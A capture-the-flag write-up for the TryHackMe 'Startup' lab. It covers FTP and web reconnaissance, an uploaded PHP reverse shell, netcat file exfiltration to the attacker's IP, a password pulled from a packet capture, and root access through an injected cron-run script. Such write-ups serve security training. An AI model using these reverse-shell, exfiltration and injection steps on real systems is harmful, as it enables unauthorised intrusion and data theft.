---
layout: default
title: Startup
parent: TryHackMe
---
# CTF Writeup: [Startup](https://tryhackme.com/room/startup)
![Category](https://img.shields.io/badge/Category-Web%20%2F%20PrivEsc-blue)
![Difficulty](https://img.shields.io/badge/Difficulty-Easy-green)
![Tags](https://img.shields.io/badge/Tags-FTP%20%7C%20Web%20Shell%20%7C%20Wireshark%20%7C%20Cron%20Job-orange)

> **Platform:** [**TryHackMe**](https://tryhackme.com/) |
> **OS:** Linux |
> **Difficulty:** Easy |
> **Date:** 31.12.2025 |
> **Author:** [*S3Z4R*](https://tryhackme.com/p/S3Z4R)

---
## 1. Reconnaissance
### Nmap
Using nmap we see that we have access to `ftp anonymous login`.
```bash
❯ nmap -sV -sC -T4 <Machine-IP>
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp [NSE: writeable]
| -rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
|_-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to <Your-IP>
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
```
We will receive two files named `important.jpg` and `notice.txt` alongside a folder named ftp (visible in nmap).

We can ftp and download these files using `anonymous login`:
```bash
❯ ftp <Machine-IP>
Name (<Machine-IP>): anonymous
Password:   #Leave Empty
ftp> get notice.txt
ftp> get important.jpg
```
the `jpg` file is a meme and the other is someone complaining about it and claiming that they are suspicious of someone.
```bash
Whoever is leaving these damn Among Us memes in this share, it IS NOT FUNNY. People downloading documents from our website will think we are a joke! Now I dont know who it is, but Maya is looking pretty sus.
```
Up until here, we know that we can ftp to the machine and we have a folder named `ftp` which is empty. We also know that Maya looks pretty sus!

Let's look for more clues.

### Directory Enumeration
Using `feroxbuster` for this purpose we have the output below:
```bash
❯ feroxbuster -u http://<Machine-IP>/ -w kali-wordlists/dirb/big.txt

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://<Machine-IP>/
 🚩  In-Scope Url          │ <Machine-IP>
 🚀  Threads               │ 50
 📖  Wordlist              │ kali-wordlists/dirb/big.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.0
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
301      GET        9l       28w      312c http://<Machine-IP>/files => http://<Machine-IP>/files/
200      GET        1l       40w      208c http://<Machine-IP>/files/notice.txt
200      GET      728l     5285w   461820c http://<Machine-IP>/files/important.jpg
[...] - 0s        20469/20469     262423/s http://<Machine-IP>/files/ftp/
```
We can see that we have the same directories as the ftp itself, this can lead to an idea!

## 2. Initial Access
> **The Idea:** What if we can put a file in ftp and execute it from the web? Let's find out!

We will create a reverse shell using [Pentest Monkey](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php).
We edit the **ip** and the **port** as below:
```php
set_time_limit (0);
$VERSION = "1.0";
$ip = 'Your-IP';  // CHANGE THIS | example: $ip = '10.20.30.40';
$port = <PORT>;       // CHANGE THIS | example: $port = 1234;
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;
```
Save the file as `reverse_shell.php`, then we get back to the ftp login and put this file into the ftp folder as below:
```bash
ftp> cd ftp
ftp> put reverse_shell.php
```
To confirm this, we will refresh the web page with the url of:
```bash
http://<Machine-IP>/files/ftp/
```
and then we can see our reverse shell.

By clicking on it, and having our `netcat` listening on the specific port. then we will take the reverse shell.
```bash
❯ nc -nlvp 1234
Ncat: Listening on :::1234
Ncat: Connection from <Machine-IP>.
 13:19:20 up 27 min,  0 users,  load average: 0.01, 0.02, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
Then we are in!

We have the following points of interests:
```bash
$ cat recipe.txt
Someone asked what our main ingredient to our spice soup is today. I figured I cant keep it a secret forever and told him it was love.
```
Which is the first flag, so `What is the secret spicy soup recipe? Love`.

There is another folder named `incidents` with `www-data` permission, which has a file named `suspicious.pcapng` This for sure looks interesting.
```bash
$ cd incidents
$ ls
suspicious.pcapng
```
Let's see if we can download this file.
We can do so using `netcat` as below:

On the `Remote Machine`:
```bash
$ nc -w 3 <Your-IP> 9876 < suspicious.pcapng
```
On the `Attacker Machine`:
```bash
❯ nc -l 9876 > suspicious.pcapng
```
Here we have it! Now let's use `wireshark` to open the file and check what is inside. For this you just run wireshark and use open in the menu.

we can see that socalled adversary Maya has done some stuff.
* She used a reverse shell just like us named `shell.php` on the same directory on `/files/ftp`.
* Used the following command to get the reverse shell: `python -c "import pty;pty.spawn('/bin/bash')"`.
* After the login went for `sudo -l` and found nothing.
* Then tried 3 guess for sudo password and failed.
* Then went to /home and took a look into /etc/passwd
* Attacker uses the following password three times, `c4ntg3t3n0ughsp1c3` which looks suspicious!

Although the attacker uses the password for root user, but she did not try it for user lennie, so let us see if it is a valid password for this user or not.
```bash
❯ ssh lennie@<Machine-IP>
lennie@<Machine-IP> password: c4ntg3t3n0ughsp1c3
$ whoami
lennie
```
So the password was in fact for user `lennie`. This means that the attacker had access to lennie's password and she was trying to get root access.

## 3. User Flag
In the home directory of lennie we can see:
```bash
$ cat user.txt
THM{03ce...0e79}
```
So that's the first flag!

## 4. Priviledge Escalation
After going to `scripts` folder we can see two other files with one of them executable to us too.
```bash
$ ls -al
total 16
drwxr-xr-x 2 root   root   4096 Nov 12  2020 .
drwx------ 5 lennie lennie 4096 Dec 31 14:09 ..
-rwxr-xr-x 1 root   root     77 Nov 12  2020 planner.sh
-rw-r--r-- 1 root   root      1 Dec 31 14:20 startup_list.txt
```
In the `planner.sh` we can see:
```bash
$ cat planner.sh
#!/bin/bash
echo $LIST > /home/lennie/scripts/startup_list.txt
/etc/print.sh
```
Let's take a look at the file mentioned here:
```bash
$ ls -al /etc/print.sh
-rwx------ 1 lennie lennie 36 Dec 31 14:41 /etc/print.sh
```
Apparently the script will run whatever we inject into `print.sh` with the `root` permission.

## 5. Root Flag
So let's inject a code to show our root flag:
```bash
$ echo "cat /root/root.txt >> /tmp/flag.txt" > /etc/print.sh
```
This will copy the flag inside of `/root/root.txt` into `/tmp/flag.txt`.

Next we run the `planner.sh` as follows:
```bash
$ ./planner.sh
./planner.sh: line 2: /home/lennie/scripts/startup_list.txt: Permission denied
cat: /root/root.txt: Permission denied
```
Despite seeing the `Permission denied`, but we should check the file we created on `tmp`.
```bash
$ cat /tmp/flag.txt
THM{f963...d76d}
```
Great! we found the final flag!

---
<p style="text-align: center; text-shadow: 0 0 5px #8B0000;"> ⸸ 𝕬𝖘 𝖞𝖔𝖚 𝖜𝖎𝖑𝖑 𝖎𝖙, 𝖘𝖔 𝖎𝖙 𝖘𝖍𝖆𝖑𝖑 𝖇𝖊 ⸸ 𝕾3𝖅4𝕽 ⸸ </p>
